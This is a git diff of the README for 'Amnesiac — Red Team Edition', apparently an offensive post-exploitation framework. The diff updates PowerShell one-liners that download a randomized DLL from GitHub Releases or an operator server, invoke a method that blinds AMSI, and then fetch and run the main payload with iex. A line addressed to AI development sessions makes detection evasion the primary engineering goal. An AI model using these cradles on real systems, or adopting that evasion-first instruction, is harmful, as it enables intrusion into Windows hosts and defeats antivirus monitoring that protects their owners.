@@ -1,4 +1,4 @@
-# Amnesiac — Red Team Edition
+﻿# Amnesiac — Red Team Edition
 
 > **For AI development sessions:** Read `docs/ARCHITECTURE.md` for the full architecture reference before making any changes. The single most important rule: **detection evasion is the primary engineering constraint** — every feature must be evaluated for disk artifacts, AMSI/ETW signatures, and anomalous target-side network traffic before implementation.
 
@@ -54,17 +54,17 @@ Use the `bootstrap` command in Amnesiac's local shell to get the exact current 3
 
 ```powershell
 # Line 1: load AmnesiacLoader.dll from GitHub Releases as raw bytes (AMSI never scans this)
-$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/eXciQ2Lokx.dll'))
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/acE6zHaZfi.dll'))
 # Line 2: call PatchAmsiReflection() via reflection — AMSI blind in this PS process
-$_a.GetType('eXciQ2Lokx.nsUwTvotvj').GetMethod('Nrfb7fybpR').Invoke($null,$null)
+$_a.GetType('acE6zHaZfi.DiWALSMq4L').GetMethod('voT3ptbqo9').Invoke($null,$null)
 # Line 3: now load Amnesiac — AMSI can't scan it
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
 ```
 
 **With operator HTTP server on network (preferred — no outbound GitHub from target):**
 ```powershell
-$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:8080/eXciQ2Lokx.dll'))
-$_a.GetType('eXciQ2Lokx.nsUwTvotvj').GetMethod('Nrfb7fybpR').Invoke($null,$null)
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:8080/acE6zHaZfi.dll'))
+$_a.GetType('acE6zHaZfi.DiWALSMq4L').GetMethod('voT3ptbqo9').Invoke($null,$null)
 iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1');Amnesiac
 ```
 
@@ -279,7 +279,7 @@ Every `Build.ps1` run randomizes the namespace, all public class names (Stomper,
 
 All pipe commands, the `bootstrap` command, and serve/sharprdp cradles use these variables — the target never sees `AmnesiacLoader`, `Stomper`, `Bypass`, or `PatchAmsiReflection`.
 
-**Current build note:** `$_alByp = "Bypass"` (the class name substitution in `Build.ps1` predates this build — `Bypass` was not randomized). `$_alPar = "gy7Kz88Hdi"`. These are correct for the embedded `odLaNcAmcd.dll`. The next `Build.ps1` run will randomize `Bypass` too.
+**Current build note:** `$_alByp = "DiWALSMq4L"`, `$_alPar = "voT3ptbqo9"`. These are correct for the embedded `acE6zHaZfi.dll`. All class/method names are fully randomized in this build.
 
 Detection surfaces eliminated:
 - Named pipe command content (pipe scanners)
@@ -534,19 +534,22 @@ a session where you have local admin.
 
 | Filename | What it is | Updated when |
 |----------|-----------|--------------|
-| `eXciQ2Lokx.dll` | AmnesiacLoader — current build (names randomized by `Build.ps1`) | Every `Build.ps1` run before a new engagement |
+| `acE6zHaZfi.dll` | AmnesiacLoader — current build (names randomized by `Build.ps1`) | Every `Build.ps1` run before a new engagement |
 | `AuthHelper.exe` | KrbRelayUp obfuscated binary | Only when the KrbRelayUp source is recompiled/re-obfuscated |
 
-> **Note:** The DLL filename (`eXciQ2Lokx.dll`) and the class/method names inside it (`eXciQ2Lokx.nsUwTvotvj`, `Nrfb7fybpR`) change every time `Build.ps1` is run. After re-running, both the Releases asset and the bootstrap docs below must be updated.
+> **Note:** The DLL filename (`acE6zHaZfi.dll`) and the class/method names inside it (`acE6zHaZfi.DiWALSMq4L`, `voT3ptbqo9`) change every time `Build.ps1` is run. After re-running, both the Releases asset and the bootstrap docs below must be updated.
 
 ### Bootstrap 3-Liner — Current Build (GitHub path)
 These are the live values for the current DLL on GitHub Releases. Update this block whenever the DLL is rebuilt and re-uploaded:
 
+> **Warning: GitHub Releases not yet updated** — eXciQ2Lokx.dll (old build) still on Releases. Upload cE6zHaZfi.dll first.
+
+
 ```powershell
 # Line 1 — load AmnesiacLoader from GitHub Releases (AMSI never scans raw bytes)
-$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/eXciQ2Lokx.dll'))
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/acE6zHaZfi.dll'))
 # Line 2 — patch AMSI via reflection
-$_a.GetType('eXciQ2Lokx.nsUwTvotvj').GetMethod('Nrfb7fybpR').Invoke($null,$null)
+$_a.GetType('acE6zHaZfi.DiWALSMq4L').GetMethod('voT3ptbqo9').Invoke($null,$null)
 # Line 3 — load Amnesiac (AMSI now blind)
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
 ```
